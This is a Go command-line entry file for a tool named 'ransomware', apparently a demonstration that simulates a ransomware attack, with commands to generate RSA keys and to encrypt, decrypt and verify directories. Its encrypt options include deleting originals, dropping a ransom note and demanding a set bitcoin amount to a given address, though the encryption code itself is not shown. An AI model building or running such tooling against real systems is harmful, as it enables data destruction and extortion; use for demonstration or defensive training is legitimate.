package main

import (
	"fmt"
	"os"
	"time"

	"github.com/common-nighthawk/go-figure"
	"github.com/marmos91/ransomware/cli"
	"github.com/marmos91/ransomware/utils"
	urfavecli "github.com/urfave/cli/v2"
)

const (
	APP_NAME        = "ransomware"
	APP_DESCRIPTION = "A simple demonstration tool to simulate a ransomware attack"
	APP_VERSION     = "v1.0.0"
)

func beforeCommand(ctx *urfavecli.Context) error {
	verbose := ctx.Bool("verbose")
	jsonFormat := ctx.Bool("jsonLogs")

	utils.SetupLogging(verbose, jsonFormat)

	if verbose {
		figure.NewFigure(APP_NAME, "graffiti", true).Print()
	}
	return nil
}

func main() {
	app := &urfavecli.App{
		Name:     APP_NAME,
		Usage:    APP_DESCRIPTION,
		Version:  APP_VERSION,
		Compiled: time.Now(),
		Authors: []*urfavecli.Author{
			{
				Name:  "Marco Moschettini",
				Email: "marco.moschettini@cubbit.io",
			},
		},
		Flags: []urfavecli.Flag{
			&urfavecli.BoolFlag{
				Name:  "verbose",
				Usage: "Runs the tool in verbose mode (more logs)",
				Value: false,
			},
			&urfavecli.BoolFlag{
				Name:    "jsonLogs",
				Aliases: []string{"json"},
				Usage:   "Enable JSON log output (default: text)",
				Value:   false,
			},
		},
		Commands: []*urfavecli.Command{
			{
				Name:    "create-keys",
				Aliases: []string{"c"},
				Usage:   "Generates a new random keypair and saves it to a file",
				Before:  beforeCommand,
				Flags: []urfavecli.Flag{
					&urfavecli.IntFlag{
						Name:  "keySize",
						Usage: "RSA key size in bits (2048, 3072, or 4096)",
						Value: 2048,
					},
					&urfavecli.StringFlag{
						Name:    "path",
						Aliases: []string{"p"},
						Usage:   "The path where to save the keys",
						Value:   ".",
					},
				},
				Action: cli.CreateKeys,
			},
			{
				Name:    "encrypt",
				Usage:   "Encrypts a directory",
				Aliases: []string{"e"},
				Before:  beforeCommand,
				Flags: []urfavecli.Flag{
					&urfavecli.StringFlag{
						Name:     "path",
						Aliases:  []string{"p"},
						Usage:    "Runs the tool on a directory",
						Required: true,
					},
					&urfavecli.StringFlag{
						Name:     "publicKey",
						Usage:    "Loads the provided RSA public key in PEM format",
						Required: true,
					},
					&urfavecli.StringFlag{
						Name:  "extBlacklist",
						Usage: "the extension to blacklist",
						Value: ".enc",
					},
					&urfavecli.StringFlag{
						Name:  "extWhitelist",
						Usage: "the extension to whitelist",
						Value: "",
					},
					&urfavecli.BoolFlag{
						Name:  "skipHidden",
						Usage: "skips hidden folders",
						Value: false,
					},
					&urfavecli.BoolFlag{
						Name:    "recursive",
						Aliases: []string{"r"},
						Usage:   "process directories recursively",
						Value:   true,
					},
					&urfavecli.BoolFlag{
						Name:  "dryRun",
						Usage: "encrypts files without deleting originals",
						Value: false,
					},
					&urfavecli.StringFlag{
						Name:  "encSuffix",
						Usage: "defines the suffix to add to encrypted files",
						Value: ".enc",
					},
					&urfavecli.BoolFlag{
						Name:  "addRansom",
						Usage: "if set to true add a ransom note to every encrypted folder",
						Value: false,
					},
					&urfavecli.StringFlag{
						Name:  "ransomTemplatePath",
						Usage: "defines where to find the template to use for the ransom note",
					},
					&urfavecli.StringFlag{
						Name:  "ransomFileName",
						Usage: "defines the name of the ransom file name",
						Value: "IMPORTANT.txt",
					},
					&urfavecli.Float64Flag{
						Name:  "bitcoinCount",
						Usage: "how many bitcoins to ask as ransom",
						Value: 0,
					},
					&urfavecli.StringFlag{
						Name:  "bitcoinAddress",
						Usage: "the bitcoin address to use",
						Value: "<bitcoin address>",
					},
					&urfavecli.IntFlag{
						Name:    "workers",
						Aliases: []string{"w"},
						Usage:   "number of parallel workers (clamped to NumCPU); higher values increase memory usage with large files",
						Value:   1,
					},
					&urfavecli.Int64Flag{
						Name:  "partial",
						Usage: "encrypt only the first N bytes of each file (0 = full encryption)",
						Value: 0,
					},
					&urfavecli.StringFlag{
						Name:  "report",
						Usage: "write a JSON summary report to the given file path",
					},
				},
				Action: cli.Encrypt,
			},
			{
				Name:    "decrypt",
				Usage:   "Decrypts a directory",
				Aliases: []string{"d"},
				Before:  beforeCommand,
				Flags: []urfavecli.Flag{
					&urfavecli.StringFlag{
						Name:     "path",
						Aliases:  []string{"p"},
						Usage:    "Runs the tool on a directory",
						Required: true,
					},
					&urfavecli.StringFlag{
						Name:     "privateKey",
						Usage:    "Loads the provided RSA private key in PEM format",
						Required: true,
					},
					&urfavecli.BoolFlag{
						Name:  "dryRun",
						Usage: "decrypts files without deleting encrypted versions",
						Value: false,
					},
					&urfavecli.BoolFlag{
						Name:  "skipHidden",
						Usage: "skips hidden folders",
						Value: false,
					},
					&urfavecli.BoolFlag{
						Name:    "recursive",
						Aliases: []string{"r"},
						Usage:   "process directories recursively",
						Value:   true,
					},
					&urfavecli.StringFlag{
						Name:  "encSuffix",
						Usage: "defines the suffix to add to encrypted files",
						Value: ".enc",
					},
					&urfavecli.StringFlag{
						Name:  "ransomFileName",
						Usage: "defines the name of the ransom file name",
						Value: "IMPORTANT.txt",
					},
					&urfavecli.IntFlag{
						Name:    "workers",
						Aliases: []string{"w"},
						Usage:   "number of parallel workers (clamped to NumCPU); higher values increase memory usage with large files",
						Value:   1,
					},
					&urfavecli.StringFlag{
						Name:  "report",
						Usage: "write a JSON summary report to the given file path",
					},
				},
				Action: cli.Decrypt,
			},
			{
				Name:    "verify",
				Usage:   "Verifies encrypted files can be decrypted without writing output",
				Aliases: []string{"v"},
				Before:  beforeCommand,
				Flags: []urfavecli.Flag{
					&urfavecli.StringFlag{
						Name:     "path",
						Aliases:  []string{"p"},
						Usage:    "Directory containing encrypted files",
						Required: true,
					},
					&urfavecli.StringFlag{
						Name:     "privateKey",
						Usage:    "Loads the provided RSA private key in PEM format",
						Required: true,
					},
					&urfavecli.BoolFlag{
						Name:  "skipHidden",
						Usage: "skips hidden folders",
						Value: false,
					},
					&urfavecli.BoolFlag{
						Name:    "recursive",
						Aliases: []string{"r"},
						Usage:   "process directories recursively",
						Value:   true,
					},
					&urfavecli.StringFlag{
						Name:  "encSuffix",
						Usage: "defines the suffix of encrypted files",
						Value: ".enc",
					},
					&urfavecli.IntFlag{
						Name:    "workers",
						Aliases: []string{"w"},
						Usage:   "number of parallel workers (clamped to NumCPU)",
						Value:   1,
					},
					&urfavecli.StringFlag{
						Name:  "report",
						Usage: "write a JSON summary report to the given file path",
					},
				},
				Action: cli.Verify,
			},
		},
	}

	if err := app.Run(os.Args); err != nil {
		fmt.Fprintf(os.Stderr, "error: %v\n", err)
		os.Exit(1)
	}
}
